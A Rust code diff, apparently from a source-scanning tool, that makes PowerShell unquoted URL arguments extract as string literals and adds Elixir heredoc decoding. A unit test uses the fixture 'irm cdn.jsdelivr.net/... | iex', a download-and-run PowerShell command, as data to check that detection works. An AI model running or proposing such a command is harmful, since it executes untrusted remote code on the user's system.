@@ -227,7 +227,7 @@ fn extract_strings(
     let mut stack: Vec<Node<'_>> = vec![root];
     while let Some(node) = stack.pop() {
         if config.string_kinds.contains(&node.kind()) {
-            if let Some(text) = decode_string_literal(node, source) {
+            if let Some(text) = decode_string_literal(node, source, config) {
                 strings.literals.push(ExtractedString {
                     text,
                     offset: node.start_byte(),
@@ -236,14 +236,79 @@ fn extract_strings(
             }
             continue;
         }
+        // PowerShell command arguments are often unquoted barewords. The
+        // grammar exposes `cdn.example/path` as a generic token rather than a
+        // string literal, even though the command receives it as a string.
+        // Promote only host/path-shaped tokens that are direct command
+        // elements; ordinary identifiers and dotted member names stay out of
+        // the precise literal tier.
+        if is_protocolless_url_argument(node, source, config) {
+            if let Ok(text) = node.utf8_text(source.as_bytes()) {
+                strings.literals.push(ExtractedString {
+                    text: text.to_string(),
+                    offset: node.start_byte(),
+                    ..ExtractedString::default()
+                });
+            }
+        }
         for child in node.children(&mut cursor) {
             stack.push(child);
         }
     }
 }
 
-fn decode_string_literal(node: Node<'_>, source: &str) -> Option<String> {
+fn is_protocolless_url_argument(node: Node<'_>, source: &str, config: &langs::LangConfig) -> bool {
+    if config.name != "powershell" || node.kind() != "generic_token" {
+        return false;
+    }
+    if node
+        .parent()
+        .is_none_or(|parent| parent.kind() != "command_elements")
+    {
+        return false;
+    }
+    let Ok(value) = node.utf8_text(source.as_bytes()) else {
+        return false;
+    };
+    looks_like_protocolless_url(value)
+}
+
+pub(super) fn looks_like_protocolless_url(value: &str) -> bool {
+    if value.contains("://") || value.is_empty() {
+        return false;
+    }
+    let Some((host, path)) = value.split_once('/') else {
+        return false;
+    };
+    if host.is_empty() || path.is_empty() || host.starts_with('.') || host.ends_with('.') {
+        return false;
+    }
+    let labels: Vec<&str> = host.split('.').collect();
+    if labels.len() < 2
+        || labels.iter().any(|label| {
+            label.is_empty() || !label.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
+        })
+        || labels
+            .last()
+            .is_none_or(|tld| tld.len() < 2 || !tld.chars().all(|c| c.is_ascii_alphabetic()))
+    {
+        return false;
+    }
+    path.chars().all(|c| {
+        c.is_ascii_alphanumeric()
+            || matches!(c, '-' | '_' | '.' | '/' | '?' | '&' | '=' | '%' | '#')
+    })
+}
+
+fn decode_string_literal(
+    node: Node<'_>,
+    source: &str,
+    config: &langs::LangConfig,
+) -> Option<String> {
     let raw = node.utf8_text(source.as_bytes()).ok()?;
+    if config.name == "elixir" && (raw.starts_with("\"\"\"") || raw.starts_with("'''")) {
+        return escapes::decode_elixir_heredoc(raw);
+    }
     if raw.is_empty() {
         return None;
     }
@@ -1021,6 +1086,19 @@ mod tests {
         let (_imports, functions) = parse_source("script.ps1", src);
         let names: Vec<&str> = functions.iter().map(String::as_str).collect();
         assert!(names.contains(&"Get-Greeting"), "got {names:?}");
+    }
+
+    #[test]
+    fn powershell_protocolless_url_argument_is_extracted_as_literal() {
+        let src = b"irm cdn.jsdelivr.net/gh/19875567137/repo/80-7314 | iex\n";
+        let parsed = crate::open_with_path(std::path::Path::new("sample.ps1"), src).unwrap();
+        assert!(
+            parsed
+                .literals()
+                .iter()
+                .any(|literal| literal.text == "cdn.jsdelivr.net/gh/19875567137/repo/80-7314"),
+            "protocol-less PowerShell URL argument was not promoted to literals"
+        );
     }
 
     /// Python `def foo()` / `class Bar:` populate the unified
